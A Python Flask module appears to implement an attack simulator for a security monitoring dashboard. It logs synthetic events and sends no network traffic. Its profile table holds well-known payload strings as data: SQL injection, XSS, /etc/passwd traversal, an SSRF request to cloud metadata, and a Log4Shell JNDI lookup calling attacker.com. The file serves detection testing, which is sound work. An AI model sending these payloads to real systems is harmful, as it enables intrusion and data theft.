"""Attack simulator API endpoints."""
from flask import Blueprint, request, jsonify
from app.utils.decorators import require_login, require_permission, get_current_user
from app.utils.security import get_client_ip
from app.services.event_service import create_event
from app.models.audit import AuditLog

simulator_bp = Blueprint("simulator", __name__)

SIMULATION_PROFILES = {
    "sql_injection": {
        "event_type": "SQL_INJECTION",
        "severity": "high",
        "action": "DROP",
        "detail": "Controlled simulator generated SQL Injection probe: ' OR 1=1 --",
        "payload": "GET /login?user=' OR 1=1 -- HTTP/1.1",
    },
    "xss": {
        "event_type": "XSS_ATTACK",
        "severity": "medium",
        "action": "DROP",
        "detail": "Controlled simulator generated XSS probe: <script>alert(1)</script>",
        "payload": "GET /search?q=<script>alert(1)</script> HTTP/1.1",
    },
    "path_traversal": {
        "event_type": "PATH_TRAVERSAL",
        "severity": "high",
        "action": "DROP",
        "detail": "Controlled simulator generated Path Traversal probe: ../../etc/passwd",
        "payload": "GET /static/../../etc/passwd HTTP/1.1",
    },
    "csrf": {
        "event_type": "CSRF_ATTACK",
        "severity": "medium",
        "action": "ALERT",
        "detail": "Cross-Site Request Forgery simulation for state-changing request validation.",
        "payload": "POST /api/transfer HTTP/1.1 (Origin: http://untrusted-attacker.com)",
    },
    "session_hijacking": {
        "event_type": "SESSION_HIJACKING",
        "severity": "high",
        "action": "DROP",
        "detail": "Session hijacking simulation using synthetic cookie replay metadata.",
        "payload": "Cookie: session_id=forged_token_admin",
    },
    "ssrf": {
        "event_type": "SSRF_ATTACK",
        "severity": "critical",
        "action": "DROP",
        "detail": "Server-Side Request Forgery simulation using blocked metadata endpoint indicator.",
        "payload": "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1",
    },
    "port_scan": {
        "event_type": "PORT_SCAN",
        "severity": "low",
        "action": "ALERT",
        "detail": "Port scanning simulator produced synthetic reconnaissance event across ports 21, 22, 80, 443.",
        "payload": "TCP SYN probe sequence",
    },
    "brute_force_ssh": {
        "event_type": "BRUTE_FORCE",
        "severity": "high",
        "action": "BAN",
        "detail": "SSH brute-force simulator produced repeated failed-login pattern.",
        "payload": "SSH-2.0-OpenSSH Auth Failed x5",
    },
    "brute_force_rdp": {
        "event_type": "BRUTE_FORCE",
        "severity": "high",
        "action": "BAN",
        "detail": "RDP brute-force simulator produced repeated failed-login pattern.",
        "payload": "RDP CredSSP Protocol Failure x5",
    },
    "dns_rebinding": {
        "event_type": "DNS_REBINDING",
        "severity": "medium",
        "action": "ALERT",
        "detail": "DNS rebinding simulator produced hostname-to-private-IP transition indicator.",
        "payload": "DNS A Record: attacker.com -> 127.0.0.1",
    },
    "ddos_syn": {
        "event_type": "SYN_FLOOD",
        "severity": "high",
        "action": "DROP",
        "detail": "Controlled SYN flood simulation logged rate anomaly without packet flood generation.",
        "payload": "SYN Flood rate threshold exceeded",
    },
    "ddos_http": {
        "event_type": "HTTP_FLOOD",
        "severity": "high",
        "action": "DROP",
        "detail": "Controlled HTTP flood simulation logged request-rate anomaly without traffic flood generation.",
        "payload": "HTTP Rate Threshold: 450 req/10s",
    },
    "api_fuzzing": {
        "event_type": "API_FUZZING",
        "severity": "medium",
        "action": "ALERT",
        "detail": "API fuzzing simulator generated malformed parameter indicators.",
        "payload": "POST /api/v1/orders with payload length > 1MB",
    },
    "jwt_alg_none": {
        "event_type": "JWT_ATTACK",
        "severity": "critical",
        "action": "DROP",
        "detail": "JWT algorithm manipulation simulation for alg=none detection.",
        "payload": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...",
    },
    "jwt_signature": {
        "event_type": "JWT_ATTACK",
        "severity": "high",
        "action": "DROP",
        "detail": "JWT signature validation simulation using tampered token metadata.",
        "payload": "Bearer tampered.signature.token",
    },
    "rate_limit_bypass": {
        "event_type": "RATE_LIMIT_BYPASS",
        "severity": "medium",
        "action": "ALERT",
        "detail": "Rate-limit bypass simulator generated header rotation indicators.",
        "payload": "X-Forwarded-For spoofed header rotation",
    },
    "k8s_misconfig": {
        "event_type": "KUBERNETES_MISCONFIGURATION",
        "severity": "high",
        "action": "ALERT",
        "detail": "Kubernetes misconfiguration test logged exposed dashboard/API indicator.",
        "payload": "GET /api/v1/namespaces/kube-system/secrets HTTP/1.1",
    },
    "cloud_misconfig": {
        "event_type": "CLOUD_MISCONFIGURATION",
        "severity": "medium",
        "action": "ALERT",
        "detail": "Cloud misconfiguration probe logged public bucket/metadata exposure indicator.",
        "payload": "AWS S3 Public Bucket Listing Check",
    },
    "log4j_exploit": {
        "event_type": "LOG4J_EXPLOIT",
        "severity": "critical",
        "action": "DROP",
        "detail": "Log4Shell JNDI injection simulation probe: ${jndi:ldap://attacker.com/payload}",
        "payload": "User-Agent: ${jndi:ldap://198.51.100.99:1389/Exploit}",
    },
    "spring4shell": {
        "event_type": "SPRING4SHELL_EXPLOIT",
        "severity": "critical",
        "action": "DROP",
        "detail": "Spring4Shell ClassLoader accessor manipulation probe: class.module.classloader",
        "payload": "POST /hello?class.module.classloader.resources=true",
    },
    "ssti": {
        "event_type": "SSTI_INJECTION",
        "severity": "high",
        "action": "DROP",
        "detail": "Server-Side Template Injection simulation probe: {{7*7}}",
        "payload": "GET /greeting?name={{7*7}} HTTP/1.1",
    },
    "webshell": {
        "event_type": "WEBSHELL_BACKDOOR",
        "severity": "critical",
        "action": "DROP",
        "detail": "Webshell backdoor access simulation: c99shell / eval(base64_decode)",
        "payload": "POST /uploads/c99shell.php HTTP/1.1",
    },
    "prototype_pollution": {
        "event_type": "PROTOTYPE_POLLUTION",
        "severity": "medium",
        "action": "DROP",
        "detail": "JavaScript Prototype Pollution simulation probe: __proto__[admin]=true",
        "payload": "{\"__proto__\": {\"admin\": true}}",
    },
}


@simulator_bp.route("/api/simulate", methods=["POST"])
@require_login
@require_permission("use_simulator")
def simulate_attack():
    """Run a controlled simulation test probe."""
    data = request.get_json(silent=True) or {}
    sim_type = data.get("type", "").lower()
    profile = SIMULATION_PROFILES.get(sim_type)

    if not profile:
        return jsonify({"success": False, "message": f"Unknown simulation type: {sim_type}"}), 400

    user = get_current_user()
    actor = user.username if user else "analyst"
    client_ip = get_client_ip(request)

    event_dict, _ = create_event(
        src_ip=f"198.51.100.{hash(sim_type) % 200 + 10}",
        dst_ip="127.0.0.1",
        protocol="TCP",
        action=profile["action"],
        severity=profile["severity"],
        category=profile["event_type"],
        detail=profile["detail"],
        payload_preview=profile["payload"],
        engine_module="SIMULATOR",
    )

    AuditLog.log(
        actor=actor,
        action="ATTACK_SIMULATED",
        result="SUCCESS",
        target_type="SIMULATOR",
        target=profile["event_type"],
        detail=f"Simulated attack: {sim_type}",
        source_ip=client_ip,
    )

    return jsonify({
        "success": True,
        "message": f"Simulation executed: {profile['event_type']}",
        "mode": "SAFE_LOG_ONLY",
        "event": event_dict,
    }), 200
